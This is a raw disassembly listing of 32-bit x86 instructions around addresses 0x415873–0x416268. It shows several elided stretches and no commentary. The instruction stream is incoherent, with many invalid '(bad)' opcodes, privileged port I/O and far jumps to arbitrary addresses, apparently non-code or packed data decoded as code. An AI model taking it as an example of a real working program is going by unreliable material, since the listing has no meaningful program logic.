  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shl    DWORD PTR [edi+0x19],cl
  415882:	lock lea esi,[ecx]
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR ds:0x43000001,al
  41588d:	iret   
  41588e:	pop    ss
  41588f:	xor    edi,ebx
  415891:	jmp    0x7e181555
  415896:	cwde   
  415897:	jp     0x415859
  415899:	mov    dl,ah
  41589b:	aaa    
  41589c:	js     0x41590c
  41589e:	pop    ebp
  41589f:	cmp    ebx,DWORD PTR [edi-0xa3afe37]
  4158a5:	sub    eax,0x9cd9c01f
  4158aa:	into   
  4158ab:	mov    cl,0xa1
  4158ad:	adc    ebp,DWORD PTR [eax+ebx*1+0x0]
  4158b1:	add    eax,0x12170e29
  4158b6:	and    al,0x65
  4158b8:	push   ebx
  4158b9:	mov    BYTE PTR [ebx],cl
  4158bb:	jne    0x4158e7
  4158bd:	adc    DWORD PTR [eax],ebp
  4158bf:	adc    DWORD PTR [edx],ecx
  4158c1:	xor    edx,DWORD PTR [ebx+0x59]
  4158c4:	push   esp
  4158c5:	push   esp
  4158c6:	sbb    eax,0x4c8273a9
  4158cb:	push   eax
  4158cc:	jl     0x41591f
  4158ce:	push   edx
  4158cf:	push   esp
  4158d0:	in     eax,dx
  4158d1:	sbb    ebx,DWORD PTR ds:0xb7be8651
  4158d7:	stos   DWORD PTR es:[edi],eax
  4158d8:	sub    BYTE PTR [esp+edx*1],0x67
  4158dc:	out    dx,eax
  4158dd:	scas   eax,DWORD PTR es:[edi]
  4158de:	imul   DWORD PTR [esi-0x64a4fe6b]
  4158e4:	xchg   ebx,eax
  4158e5:	adc    esp,edi
  4158e7:	imul   esp,DWORD PTR [ebx],0xde4751c3
  4158ed:	les    esi,FWORD PTR [edx]
  4158ef:	(bad)  
  4158f0:	push   edx
  4158f1:	mov    ah,0xaa
  4158f3:	sub    BYTE PTR [ebx],ah
  4158f5:	gs inc esi
  4158f7:	rcl    BYTE PTR [ecx+0x5d],0x16
  4158fb:	arpl   si,bx
  4158fd:	loop   0x415958
  4158ff:	(bad)  [esi+0x588cf70a]
  415905:	jp     0x41589f
  415907:	scas   eax,DWORD PTR es:[edi]
  415908:	gs or  bl,bh
  41590b:	sub    ebx,0x2
  41590e:	repnz pop esi
  415910:	rcl    BYTE PTR [edx-0x49],cl
  415913:	cmc    
  415914:	inc    edi
  415915:	outs   dx,BYTE PTR ds:[esi]
  415916:	repz dec ecx
  415918:	inc    ebx
  415919:	ret    0x5a17
  41591c:	aas    
  41591d:	stos   BYTE PTR es:[edi],al
  41591e:	add    BYTE PTR [ebx+0x59a1b652],dl
  415924:	lds    esi,FWORD PTR [ebp-0x55c47e80]
  41592a:	jno    0x4158c5
  41592c:	sbb    al,BYTE PTR [eax+eiz*2]
  41592f:	cwde   
  415930:	xor    eax,0xa4248c4c
  415935:	repz fiadd DWORD PTR [eax]
  415938:	jp     0x4158cf
  41593a:	(bad)  
  41593b:	sub    edx,DWORD PTR [ecx-0x75da894c]
  415941:	das    
  415942:	push   ds
  415943:	inc    edi
  415944:	sahf   
  415945:	mov    BYTE PTR ss:[ecx+0x9142404],dh
  41594c:	gs dec edx
  41594e:	idiv   esp
  415950:	mov    edi,0x3fb7e02d
  415955:	inc    edi
  415956:	ror    DWORD PTR ds:0x94edafc7,1
  41595c:	xchg   ebp,eax
  41595d:	test   al,0x35
  41595f:	(bad)  
  415960:	les    eax,FWORD PTR [edx]
  415962:	cmp    DWORD PTR [ecx],edi
  415964:	in     eax,dx
  415965:	int    0xd8
  415967:	shl    BYTE PTR [edi-0x1f],0x5
  41596b:	or     al,0xad
  41596e:	and    DWORD PTR [edx-0x2007f62b],esi
  415974:	xchg   esp,eax
  415975:	leave  
  415976:	cld    
  415977:	mov    ah,0x2f
  415979:	cmp    eax,esp
  41597b:	and    al,0x9a
  41597d:	mov    edi,0xff944932
  415982:	mul    eax
  415984:	aaa    
  415985:	mov    ds:0xb5a1c2f0,eax
  41598a:	mov    WORD PTR [ecx],ds
  41598c:	cmp    ebp,0xa5310
	...
  4159f2:	add    BYTE PTR [eax],al
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	loop   0x415a4c
  415a02:	test   edx,0xe436
  415a08:	add    eax,0x3e000001
  415a0d:	int3   
  415a0e:	dec    ecx
  415a0f:	pop    esi
  415a10:	sub    BYTE PTR [ebx],al
  415a12:	push   0xffffffd8
  415a14:	scas   al,BYTE PTR es:[edi]
  415a15:	sti    
  415a16:	pop    edx
  415a17:	sbb    eax,0x53de6f99
  415a1c:	inc    esp
  415a1d:	mov    ch,0xd2
  415a1f:	mov    bh,0x3e
  415a21:	sub    al,0x55
  415a23:	fnstcw WORD PTR [edi-0x26a37b91]
  415a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a2a:	pop    esp
  415a2b:	loopne 0x415a35
  415a2d:	add    BYTE PTR [edx+0xf],ah
  415a30:	mov    ebx,0xd73b27fc
  415a35:	and    al,0xb3
  415a37:	ret    0x8877
  415a3a:	jl     0x415a0b
  415a3c:	sar    DWORD PTR [edx],1
  415a3e:	ret    
  415a3f:	mov    edx,ebp
  415a41:	fcmovnbe st,st(6)
  415a43:	cs sub eax,0x540d8ee7
  415a49:	clc    
  415a4a:	mov    ah,0x32
  415a4c:	aam    0xc3
  415a4e:	mov    ah,0x8a
  415a50:	or     ebp,DWORD PTR [edx-0xa]
  415a53:	xchg   ebx,eax
  415a54:	xor    ah,BYTE PTR [eax+ecx*4]
  415a57:	jns    0x415acf
  415a59:	pop    esp
  415a5a:	addr16 out dx,eax
  415a5c:	push   cs
  415a5d:	fist   DWORD PTR [edi-0x17]
  415a60:	adc    eax,0x71001af7
  415a65:	repz retf 
  415a67:	push   0x1
  415a69:	dec    ebx
  415a6a:	xor    cl,ch
  415a6c:	hlt    
  415a6d:	sar    DWORD PTR [eax+0x4e],0x38
  415a71:	fbstp  TBYTE PTR [edi+0x18148136]
  415a77:	sbb    BYTE PTR [edi+0x1a],cl
  415a7a:	add    eax,0xc1b7a8a2
  415a7f:	retf   
  415a80:	mov    ds:0x68864141,eax
  415a85:	cmp    DWORD PTR [esi-0x33],0x63
  415a89:	adc    al,0x18
  415a8b:	xor    BYTE PTR [eax+ecx*2+0x6877e14b],ch
  415a92:	test   bh,cl
  415a94:	inc    edi
  415a95:	stos   BYTE PTR es:[edi],al
  415a96:	aaa    
  415a97:	adc    DWORD PTR [edi+0xc187d2],edx
  415a9d:	xor    al,0xed
  415a9f:	jl     0x415ac2
  415aa1:	fldpi  
  415aa3:	push   cs
  415aa4:	or     al,0xba
  415aa6:	mov    gs,ebx
  415aa8:	out    dx,eax
  415aa9:	inc    ecx
  415aaa:	inc    esi
  415aab:	adc    al,0x26
  415aad:	stos   DWORD PTR es:[edi],eax
  415aae:	fsubr  QWORD PTR [edx]
  415ab0:	(bad)  
  415ab1:	int    0xad
  415ab3:	lahf   
  415ab4:	in     eax,dx
  415ab5:	(bad)  
  415ab6:	mov    ds:0x6964032f,al
  415abb:	nop
  415abc:	div    esi
  415abe:	fwait
  415abf:	popa   
  415ac0:	js     0x415a9f
  415ac2:	addr16 push ecx
  415ac4:	pop    ebx
  415ac5:	mov    ecx,?
  415ac7:	mov    esp,DWORD PTR [esi+esi*2]
  415aca:	repz xchg ebp,eax
  415acc:	push   ss
  415acd:	in     eax,dx
  415ace:	icebp  
  415acf:	pop    es
  415ad0:	dec    ebx
  415ad1:	inc    esp
  415ad2:	mov    edx,edx
  415ad4:	or     ebp,eax
  415ad6:	cmp    al,0xc0
  415ad8:	mov    edx,DWORD PTR [ecx-0x4c6e509b]
  415ade:	sbb    al,0x10
  415ae0:	mov    ds:0x5910c258,eax
  415ae5:	loope  0x415ac4
  415ae7:	mov    edi,0x74954f09
  415aec:	sub    BYTE PTR [edx-0x52],0xbe
  415af0:	aad    0x9d
  415af2:	sub    al,0x82
  415af4:	ins    BYTE PTR es:[edi],dx
  415af5:	jns    0x415b59
  415af7:	cmp    eax,0x8215f018
  415afc:	fistp  WORD PTR [ebx+0x506a965]
  415b02:	inc    edi
  415b03:	and    eax,esi
  415b05:	and    cl,BYTE PTR [ecx-0xdde4136]
  415b0b:	sbb    al,0x3b
  415b0d:	mov    dh,0x80
  415b0f:	sbb    edi,DWORD PTR [ebx+0x0]
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fmul   QWORD PTR [ebp-0x15]
  415b82:	cmp    edi,esp
  415b84:	cmp    esp,ebp
  415b86:	add    BYTE PTR [eax],al
  415b88:	add    eax,0x16000001
  415b8d:	dec    eax
  415b8e:	pusha  
  415b8f:	and    BYTE PTR [edx],cl
  415b91:	cmp    al,0x9e
  415b93:	sub    BYTE PTR [ebx+0x58],cl
  415b96:	mov    al,BYTE PTR [ecx-0x2b2fa7ff]
  415b9c:	in     eax,0x8c
  415b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b9f:	and    BYTE PTR [ecx],0x90
  415ba2:	mov    ebp,0x1e18c1ca
  415ba7:	repz xchg edx,eax
  415ba9:	mov    eax,ds:0x14a4d3bc
  415bae:	or     edx,DWORD PTR [edi-0x3ebab1e]
  415bb4:	imul   esi,DWORD PTR [edi],0x85ebd132
  415bba:	dec    eax
  415bbb:	int    0xaa
  415bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bbe:	mov    al,ds:0x526e1868
  415bc3:	mov    fs,WORD PTR [esi-0xcf096d3]
  415bc9:	xor    bl,dl
  415bcb:	add    BYTE PTR [ebx+ecx*1-0xc575545],al
  415bd2:	jnp    0x415c11
  415bd4:	popa   
  415bd5:	mov    dl,0xad
  415bd7:	ins    BYTE PTR es:[edi],dx
  415bd8:	jg     0x415c05
  415bda:	loop   0x415bfe
  415bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bdd:	fisubr WORD PTR [edi]
  415bdf:	cli    
  415be0:	or     esp,DWORD PTR [eax+ebx*4+0x5a]
  415be4:	pop    esp
  415be5:	mov    bl,0x93
  415be7:	jmp    0x24ab2807
  415bec:	xor    BYTE PTR [ebx+0x1a],ch
  415bef:	mov    al,0xf5
  415bf1:	jmp    0x13c8e141
  415bf6:	mov    DWORD PTR [ebx],ebx
  415bf8:	cld    
  415bf9:	xchg   ebx,eax
  415bfa:	jae    0x415c6c
  415bfc:	pusha  
  415bfd:	and    eax,0x60454fcc
  415c02:	push   esi
  415c03:	out    dx,eax
  415c04:	add    BYTE PTR [edi+0x2e8b51dd],al
  415c0a:	popa   
  415c0b:	std    
  415c0c:	mov    eax,0x7eb68622
  415c11:	cwde   
  415c12:	mov    esi,0xa6996a7c
  415c17:	test   ebx,0xc07e2e35
  415c1d:	in     eax,dx
  415c1e:	jg     0x415c99
  415c20:	adc    eax,0x2bce6478
  415c25:	test   eax,0x1908dcef
  415c2a:	pop    ds
  415c2b:	push   ds
  415c2c:	dec    edi
  415c2d:	test   ch,bh
  415c2f:	xchg   ecx,eax
  415c30:	(bad)  
  415c31:	fcom   st(0)
  415c33:	mov    ebp,0x453cdbe5
  415c38:	mov    ebx,0x91ff8531
  415c3d:	fnstsw WORD PTR [edi-0x4]
  415c40:	(bad)  
  415c42:	bound  ecx,QWORD PTR [eax-0x45]
  415c45:	xlat   BYTE PTR ds:[ebx]
  415c46:	sub    eax,0x7675da47
  415c4b:	mov    eax,ds:0x38d3b650
  415c50:	push   eax
  415c51:	ror    DWORD PTR [esi-0x4783bde8],0xb
  415c58:	mov    BYTE PTR [edi],0x9e
  415c5b:	int    0x13
  415c5d:	in     eax,dx
  415c5e:	fnsave [edx-0x4e]
  415c61:	in     eax,0x48
  415c63:	dec    esp
  415c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c65:	dec    ebp
  415c66:	pop    ds
  415c67:	pusha  
  415c68:	repnz cmp ebx,ebx
  415c6b:	sub    al,0xee
  415c6d:	push   ss
  415c6e:	dec    ebx
  415c6f:	jb     0x415c71
  415c71:	xchg   BYTE PTR [ebp+0x69],al
  415c74:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  415c76:	adc    DWORD PTR [esi+0x65],edx
  415c79:	adc    DWORD PTR [edx+ebx*2-0x18],eax
  415c7d:	sti    
  415c7e:	sbb    esi,edi
  415c80:	push   edi
  415c81:	leave  
  415c82:	jmp    0x2868:0x24435518
  415c89:	add    edx,DWORD PTR [eax-0x51]
  415c8c:	sub    DWORD PTR [edi-0x71],ebp
  415c8f:	mov    ah,0xb9
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0x44e2871f
  415d03:	dec    esi
  415d04:	inc    eax
  415d05:	out    0x0,al
  415d07:	add    BYTE PTR ds:0xe5000001,al
  415d0d:	jno    0x415cdf
  415d0f:	mov    ah,0xb3
  415d11:	inc    esp
  415d12:	jl     0x415d88
  415d14:	dec    ecx
  415d15:	push   es
  415d16:	imul   ecx,edx,0xffffffdb
  415d19:	mov    ch,0x69
  415d1b:	adc    eax,esi
  415d1d:	xor    ebp,DWORD PTR [esi+0xe6a6904]
  415d23:	cmc    
  415d24:	xor    BYTE PTR [edx+ebp*4-0x1806a59],dh
  415d2b:	inc    ecx
  415d2c:	les    ebx,FWORD PTR [edx+ebx*1+0x6a86d8c]
  415d33:	xor    bl,BYTE PTR [ebx]
  415d35:	push   ds
  415d36:	rol    DWORD PTR [edi+0x72d16ff1],0x8f
  415d3d:	js     0x415d94
  415d3f:	repz dec esi
  415d41:	ds sub eax,0xb7cf761f
  415d47:	and    eax,0x682aaa36
  415d4c:	lds    esi,FWORD PTR [eax+eax*1-0x42c32bde]
  415d53:	popf   
  415d54:	pop    eax
  415d55:	jae    0x415d99
  415d57:	sbb    edx,DWORD PTR [eax+0x7a660918]
  415d5d:	popa   
  415d5e:	push   cs
  415d5f:	sub    BYTE PTR [esi+0x7f218016],dl
  415d65:	xor    edi,DWORD PTR [edi+eax*1]
  415d68:	add    eax,0xf3a0408e
  415d6d:	clc    
  415d6e:	repnz xor DWORD PTR es:[esi-0x19],0xffffff8d
  415d74:	jno    0x415d29
  415d76:	adc    bh,BYTE PTR [ebp-0x6f416b71]
  415d7c:	dec    esi
  415d7d:	fisttp WORD PTR [ebp-0x228565b4]
  415d83:	dec    edi
  415d84:	push   edx
  415d85:	out    dx,eax
  415d86:	test   bl,dh
  415d88:	sbb    ch,BYTE PTR ds:0xccbfddb1
  415d8e:	jp     0x415d2c
  415d90:	add    eax,0xd1ab0f9f
  415d95:	mov    esi,0xfa59370b
  415d9a:	outs   dx,BYTE PTR ds:[esi]
  415d9b:	ins    DWORD PTR es:[edi],dx
  415d9c:	sub    ebp,DWORD PTR ds:0xc3bfe323
  415da2:	rdmsr  
  415da4:	loopne 0x415d3c
  415da6:	mov    cl,0xde
  415da8:	rol    DWORD PTR [edx-0x2356c365],cl
  415dae:	dec    esi
  415daf:	adc    edi,eax
  415db1:	call   0x2f3fd35a
  415db6:	aaa    
  415db7:	pop    esi
  415db8:	fadd   DWORD PTR [edi]
  415dba:	dec    eax
  415dbb:	fdivr  QWORD PTR ds:0xb629ad5f
  415dc1:	ret    0x7aa4
  415dc4:	jl     0x415dcf
  415dc6:	je     0x415dc1
  415dc8:	fwait
  415dc9:	or     BYTE PTR [ebp+0x1a6f0db6],0xdf
  415dd0:	(bad)  
  415dd1:	icebp  
  415dd2:	jmp    0x415d5e
  415dd4:	xor    al,0x53
  415dd6:	mov    ah,0xf
  415dd8:	dec    esi
  415dd9:	int    0x5
  415ddb:	scas   eax,DWORD PTR es:[edi]
  415ddc:	loop   0x415dd3
  415dde:	jl     0x415da8
  415de0:	inc    ebx
  415de1:	push   esi
  415de2:	iret   
  415de3:	jg     0x415daa
  415de5:	push   ecx
  415de6:	(bad)  
  415de7:	mov    ebp,cs
  415de9:	xchg   ebp,eax
  415dea:	jle    0x415e3b
  415dec:	and    BYTE PTR [edx+0x5b5deb8f],al
  415df2:	fcom   DWORD PTR [ebx-0x4f4ab3f6]
  415df8:	je     0x415daa
  415dfa:	stos   BYTE PTR es:[edi],al
  415dfb:	fidivr DWORD PTR ds:0x9a2a407d
  415e01:	push   esi
  415e02:	push   eax
  415e03:	outs   dx,DWORD PTR ds:[esi]
  415e04:	ins    BYTE PTR es:[edi],dx
  415e05:	inc    eax
  415e06:	pop    esi
  415e07:	sbb    eax,0xc600d66b
  415e0c:	clc    
  415e0d:	ins    DWORD PTR es:[edi],dx
  415e0e:	jae    0x415e7a
  415e10:	fiadd  WORD PTR [eax]
	...
  415e72:	add    BYTE PTR [eax],al
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x4b]
  415e81:	inc    edi
  415e82:	dec    ebp
  415e83:	add    BYTE PTR [ebp-0x19],0x0
  415e87:	add    BYTE PTR ds:0x57000001,al
  415e8d:	xchg   esp,eax
  415e8e:	xor    DWORD PTR [ebx],0xbd3d8bc6
  415e94:	fld    TBYTE PTR [edi-0x38]
  415e97:	push   esi
  415e98:	ret    
  415e99:	jmp    0x5865:0xdb4876f8
  415ea0:	pushf  
  415ea1:	push   0xffffff9d
  415ea3:	lea    eax,[edi-0x58]
  415ea6:	sbb    ecx,DWORD PTR [ebp-0x18]
  415ea9:	cmp    DWORD PTR [eax],ebp
  415eab:	mov    es,WORD PTR [edi+0x17]
  415eae:	mov    dh,0x78
  415eb0:	test   al,0xad
  415eb2:	imul   ecx,ebp,0x46230d76
  415eb8:	cld    
  415eb9:	push   ss
  415eba:	fs mov dh,al
  415ebd:	sbb    dl,BYTE PTR [ebx]
  415ebf:	jmp    0x415e68
  415ec1:	push   0x9850de1
  415ec6:	nop
  415ec7:	dec    esp
  415ec8:	mov    al,0xd1
  415eca:	ins    BYTE PTR es:[edi],dx
  415ecb:	ins    DWORD PTR es:[edi],dx
  415ecc:	dec    ecx
  415ecd:	mov    DWORD PTR [eax-0xe],esp
  415ed0:	mov    ch,0x20
  415ed2:	mov    WORD PTR ds:0xbeb229ad,es
  415ed8:	jle    0x415e71
  415eda:	in     al,0x2b
  415edc:	lods   al,BYTE PTR ds:[esi]
  415edd:	sbb    BYTE PTR [ebx+0x23],ah
  415ee0:	stc    
  415ee1:	jo     0x415e8f
  415ee3:	sub    DWORD PTR [edi+edx*2+0x2b9a4ed2],0x89428c51
  415eee:	and    al,0x58
  415ef0:	out    0x4e,eax
  415ef2:	push   ebp
  415ef3:	outs   dx,BYTE PTR ds:[esi]
  415ef4:	xchg   ecx,eax
  415ef5:	test   DWORD PTR [edx],ebp
  415ef7:	int3   
  415ef8:	(bad)  
  415ef9:	stos   BYTE PTR es:[edi],al
  415efa:	sub    BYTE PTR [edx+eiz*1-0x192cf36b],ah
  415f01:	or     al,BYTE PTR [esi-0x460edd9c]
  415f07:	cmp    cl,dl
  415f09:	loope  0x415e9c
  415f0b:	pop    ebp
  415f0c:	iret   
  415f0d:	cmp    edx,DWORD PTR [eax-0x1cdcc6a3]
  415f13:	xor    DWORD PTR [esi-0x6e],ecx
  415f16:	and    bl,dh
  415f18:	fnstenv [ebx+0x53fdd854]
  415f1e:	dec    esi
  415f1f:	(bad)  
  415f21:	(bad)  [ecx]
  415f23:	adc    eax,0x51c05737
  415f28:	mov    WORD PTR [ebp+0x79150974],es
  415f2e:	and    DWORD PTR [ecx-0x6616c9a0],0xf07c07d2
  415f38:	sub    ebx,DWORD PTR [eax-0x4d]
  415f3b:	inc    esp
  415f3c:	add    DWORD PTR [eax-0x231211b4],esp
  415f42:	inc    ebp
  415f43:	push   ebp
  415f44:	pop    ds
  415f45:	mov    esp,0xd98c3427
  415f4a:	cmp    DWORD PTR [edx],eax
  415f4c:	lods   eax,DWORD PTR ds:[esi]
  415f4d:	ins    BYTE PTR es:[edi],dx
  415f4e:	out    0x89,eax
  415f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f51:	shr    DWORD PTR [eax-0x62],0x26
  415f55:	popf   
  415f56:	imul   edi,ecx,0xffffffd0
  415f59:	pop    esp
  415f5a:	pop    ecx
  415f5b:	push   esi
  415f5c:	(bad)  
  415f5d:	mov    ds:0x1f569cd1,eax
  415f62:	push   ss
  415f63:	sti    
  415f64:	add    DWORD PTR [ecx+0x39],esp
  415f67:	mov    edx,ds
  415f69:	xchg   DWORD PTR [eax],edx
  415f6b:	(bad)
  415f6e:	lods   eax,DWORD PTR ds:[esi]
  415f6f:	(bad)  
  415f70:	or     al,0xed
  415f72:	stc    
  415f73:	mov    esp,0xd3692051
  415f78:	fs mov bl,0xc6
  415f7b:	not    DWORD PTR [edi-0x226f54a4]
  415f81:	fidiv  DWORD PTR [edi]
  415f83:	push   0xffffffc8
  415f85:	in     al,dx
  415f86:	mov    edx,0x5e95b19e
  415f8b:	in     eax,0xbc
  415f8d:	xchg   ebx,eax
  415f8e:	push   cs
  415f8f:	imul   esi,ebx,0x0
	...
  415ff2:	add    BYTE PTR [eax],al
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	js     0x41605b
  416002:	loopne 0x41606f
  416004:	dec    edx
  416005:	call   0x146600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	sub    eax,0xa8abda17
  416011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416012:	mov    bl,0xa2
  416014:	test   BYTE PTR [esi+0x1e],bh
  416017:	clc    
  416018:	imul   esi,DWORD PTR [edi],0xffffffdf
  41601b:	data16 shl bl,cl
  41601e:	lods   al,BYTE PTR ds:[esi]
  41601f:	jl     0x41609b
  416021:	test   al,0xbe
  416023:	jmp    0x416071
  416025:	loopne 0x416089
  416027:	stos   BYTE PTR es:[edi],al
  416028:	or     BYTE PTR [esi+0x6894880d],al
  41602e:	mov    cl,0xc1
  416030:	pop    eax
  416031:	out    dx,eax
  416032:	loopne 0x4160ad
  416034:	ins    BYTE PTR es:[edi],dx
  416035:	std    
  416036:	add    eax,0x3c540cf6
  41603b:	dec    edx
  41603c:	cmc    
  41603d:	enter  0xdd18,0xaf
  416041:	cld    
  416042:	pusha  
  416043:	loop   0x415fe8
  416045:	ja     0x4160b7
  416047:	daa    
  416048:	sbb    al,0x25
  41604a:	xchg   dh,bh
  41604c:	xor    al,0x8f
  41604e:	fst    QWORD PTR [ebx]
  416050:	pop    esi
  416051:	arpl   sp,cx
  416053:	jg     0x4160c3
  416055:	mov    al,ds:0x1174ca29
  41605a:	test   BYTE PTR ds:[ecx+0x2b],al
  41605e:	sub    ebx,DWORD PTR [ebx+0x51e3d233]
  416064:	repnz cmp bh,ah
  416067:	sub    al,0xe8
  416069:	inc    ebx
  41606a:	mov    WORD PTR [edi+0x2b],?
  41606d:	fst    QWORD PTR [esi]
  41606f:	jb     0x416027
  416071:	fnstsw WORD PTR [edi-0x3f969ce0]
  416077:	and    esp,DWORD PTR [ebx]
  416079:	add    edi,edi
  41607b:	mov    dl,0x34
  41607d:	cmp    eax,0xd917febd
  416082:	out    dx,eax
  416083:	xor    BYTE PTR [esi-0x2fe4c02b],ch
  416089:	ins    BYTE PTR es:[edi],dx
  41608a:	hlt    
  41608b:	ins    DWORD PTR es:[edi],dx
  41608c:	inc    eax
  41608d:	test   al,0xb7
  41608f:	pop    es
  416090:	jle    0x416056
  416092:	fmul   st(4),st
  416094:	xor    ebx,eax
  416096:	das    
  416097:	int3   
  416098:	jg     0x41602a
  41609a:	xor    al,0x48
  41609c:	ins    BYTE PTR es:[edi],dx
  41609d:	add    al,0x30
  41609f:	pop    ecx
  4160a0:	push   esp
  4160a1:	pop    esp
  4160a2:	add    eax,0x81ac5abd
  4160a7:	dec    edi
  4160a8:	sbb    DWORD PTR ds:0x902d1aa,eax
  4160ae:	pop    edx
  4160af:	or     ecx,esp
  4160b1:	mov    ch,0xf4
  4160b3:	xchg   ebx,eax
  4160b4:	jae    0x416095
  4160b6:	clc    
  4160b7:	mov    edi,0x9d2b6a82
  4160bc:	sbb    al,dh
  4160be:	jmp    0x6de4444f
  4160c3:	gs mov bl,dl
  4160c6:	mov    WORD PTR [ebx],fs
  4160c8:	push   edx
  4160c9:	push   es
  4160ca:	out    dx,eax
  4160cb:	jnp    0x4160b7
  4160cd:	push   ecx
  4160ce:	mov    ah,0x8c
  4160d0:	or     eax,0x49bb226d
  4160d5:	mov    ebx,0x608d5436
  4160da:	xor    edx,edi
  4160dc:	jge    0x4160cd
  4160de:	lahf   
  4160df:	mov    edi,ecx
  4160e1:	sti    
  4160e2:	xchg   edi,eax
  4160e3:	sbb    bh,0xa1
  4160e6:	pop    esi
  4160e7:	dec    edi
  4160e8:	mov    ds:0xa73728e0,eax
  4160ed:	int3   
  4160ee:	(bad)  
  4160ef:	rol    BYTE PTR [edx+0x2fe6819a],0x6a
  4160f6:	adc    DWORD PTR [eax+ecx*8+0x2b398d65],esi
  4160fd:	retf   0xe616
  416100:	push   ebx
  416101:	pop    ecx
  416102:	sub    eax,0x51229ffe
  416107:	lock push ds
  416109:	jg     0x41608d
  41610b:	(bad)  
  41610c:	dec    esp
  41610d:	push   edi
  41610e:	test   eax,0xe773
	...
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x7c51bcf3
  416183:	pop    edi
  416184:	dec    edi
  416185:	jmp    0x146618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	call   0xbb02a881
  416191:	out    dx,al
  416192:	lods   eax,DWORD PTR ds:[esi]
  416193:	nop
  416194:	xor    BYTE PTR [esi],bh
  416196:	jbe    0x41617a
  416198:	push   esp
  416199:	push   0x64
  41619b:	mov    eax,ecx
  41619d:	cmp    dl,BYTE PTR ds:0x6c68e2d8
  4161a3:	inc    ebp
  4161a4:	cld    
  4161a5:	aad    0xbb
  4161a7:	inc    ecx
  4161a8:	out    0x9e,al
  4161aa:	and    eax,0x3e068cba
  4161af:	jb     0x4161ca
  4161b1:	xchg   esi,eax
  4161b2:	lea    eax,[eax-0x2b4e962f]
  4161b8:	out    dx,al
  4161b9:	push   cs
  4161ba:	inc    edi
  4161bb:	int3   
  4161bc:	rcl    bl,cl
  4161be:	push   eax
  4161bf:	aam    0xeb
  4161c1:	or     ah,BYTE PTR [eax+0x7aac15fa]
  4161c7:	jmp    0xa1f9:0xea3bc9e1
  4161ce:	and    ebx,edx
  4161d0:	bound  esp,QWORD PTR [ecx+0x63373963]
  4161d6:	inc    edx
  4161d7:	and    DWORD PTR ds:0xd5caa3ff,esi
  4161dd:	jae    0x41623e
  4161df:	add    al,0x26
  4161e1:	push   eax
  4161e2:	push   cs
  4161e3:	clc    
  4161e4:	ja     0x4161d4
  4161e6:	mov    bl,0x8d
  4161e8:	scas   eax,DWORD PTR es:[edi]
  4161e9:	push   0x9919675b
  4161ee:	imul   dh
  4161f0:	scas   eax,DWORD PTR es:[edi]
  4161f1:	test   BYTE PTR [edx],cl
  4161f3:	xor    BYTE PTR [edx],ah
  4161f5:	(bad)  
  4161f6:	jmp    0x4092:0xb1126233
  4161fd:	cld    
  4161fe:	sbb    DWORD PTR [esi],0x322f6d59
  416204:	in     al,dx
  416205:	pusha  
  416206:	jmp    0x39bcda1f
  41620b:	int3   
  41620c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41620d:	fs ins BYTE PTR es:[edi],dx
  41620f:	push   cs
  416210:	arpl   WORD PTR [ecx+0x2a3100e4],sp
  416216:	nop
  416217:	ficomp DWORD PTR [eax+0x100d29bf]
  41621d:	dec    edi
  41621e:	(bad)  
  41621f:	jle    0x41628d
  416221:	or     eax,0x8f8860a6
  416226:	push   ebp
  416227:	cmp    BYTE PTR [edi+eiz*4],ah
  41622a:	pop    edi
  41622b:	mov    eax,0xe7c4a2ae
  416230:	mov    BYTE PTR [eax+ebp*1],al
  416233:	pop    esi
  416234:	mov    cl,cl
  416236:	faddp  st(5),st
  416238:	enter  0x3d2f,0x34
  41623c:	cmp    edi,DWORD PTR [esi-0x26]
  41623f:	sub    al,0x33
  416241:	fisubr WORD PTR [edi+ebp*2]
  416244:	(bad)  
  416245:	shr    DWORD PTR [ecx-0x7],cl
  416248:	dec    esp
  416249:	push   es
  41624a:	imul   ecx,DWORD PTR [esi],0x8fb9073f
  416250:	pop    es
  416251:	add    eax,0x32b1acb3
  416256:	lods   al,BYTE PTR ds:[esi]
  416257:	and    edi,DWORD PTR [ecx+0x6c]
  41625a:	xchg   edi,eax
  41625b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41625c:	adc    DWORD PTR [ecx],eax
  41625e:	arpl   WORD PTR [eax+0x78c50324],bx
  416264:	pop    esi
  416265:	retf   0x4cd9
  416268:	xchg   ebx,eax
